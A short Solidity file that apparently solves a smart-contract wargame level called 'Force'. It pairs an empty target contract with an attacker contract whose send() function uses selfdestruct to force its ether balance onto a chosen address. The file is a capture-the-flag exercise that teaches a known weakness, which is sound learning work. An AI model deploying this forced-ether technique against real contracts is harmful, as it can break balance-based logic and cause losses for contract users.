// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract Atk_Force {
    address public target;

    constructor(address addr) {
        target = addr;
    }

    function set_target(address addr) public {
        target = addr;
    }

    function send() public {
        selfdestruct(payable(target));
    }

    fallback() payable external {
    }
}